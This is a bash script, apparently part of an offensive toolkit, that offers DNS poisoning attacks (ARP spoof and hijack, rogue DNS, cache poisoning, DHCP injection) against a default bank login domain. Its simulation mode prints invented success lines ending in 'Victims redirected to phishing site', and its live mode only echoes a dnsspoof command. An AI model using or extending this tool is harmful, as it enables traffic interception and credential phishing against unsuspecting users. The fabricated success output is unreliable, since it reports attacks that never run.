#!/bin/bash
# NULLSEC DNS Poisoning - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC DNS POISON ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
echo -e "  ${YELLOW}Attack type:${RESET}"
echo -e "    ${DIM}1) ARP spoof + DNS hijack${RESET}"
echo -e "    ${DIM}2) Rogue DNS server${RESET}"
echo -e "    ${DIM}3) DNS cache poisoning${RESET}"
echo -e "    ${DIM}4) DHCP DNS injection${RESET}"
read -p "$(echo -e ${WHITE}'  [>] Select [1-4]: '${RESET})" ATTACK; [ -z "$ATTACK" ] && ATTACK="1"
read -p "$(echo -e ${WHITE}'  [>] Target domain: '${RESET})" DOMAIN; [ -z "$DOMAIN" ] && DOMAIN="login.bank.com"
read -p "$(echo -e ${WHITE}'  [>] Spoofed IP: '${RESET})" SPOOF_IP; [ -z "$SPOOF_IP" ] && SPOOF_IP="10.0.0.100"
read -p "$(echo -e ${WHITE}'  [>] Interface: '${RESET})" IFACE; [ -z "$IFACE" ] && IFACE="eth0"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    attacks=("ARP+DNS Hijack" "Rogue DNS" "Cache Poison" "DHCP Injection")
    echo -e "${YELLOW}[*]${RESET} Executing ${attacks[$((ATTACK-1))]}"
    echo -e "${DIM}[*] Interface: $IFACE${RESET}"; sleep 0.4
    case $ATTACK in
        1)
            echo -e "${DIM}[*] ARP spoofing gateway...${RESET}"; sleep 0.5
            echo -e "${GREEN}[+]${RESET} MITM position established"
            echo -e "${GREEN}[+]${RESET} DNS queries intercepted"
            ;;
        2)
            echo -e "${DIM}[*] Starting rogue DNS on :53...${RESET}"; sleep 0.5
            echo -e "${GREEN}[+]${RESET} Rogue DNS active"
            ;;
        3)
            echo -e "${DIM}[*] Sending forged DNS responses...${RESET}"; sleep 0.5
            echo -e "${GREEN}[+]${RESET} Cache poisoned on target resolver"
            ;;
        4)
            echo -e "${DIM}[*] Spoofing DHCP response...${RESET}"; sleep 0.5
            echo -e "${GREEN}[+]${RESET} Client received malicious DNS"
            ;;
    esac
    echo -e "${GREEN}[+]${RESET} $DOMAIN -> $SPOOF_IP"
    echo -e "${GREEN}[+]${RESET} Victims redirected to phishing site"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} dnsspoof -i $IFACE host $DOMAIN"
fi
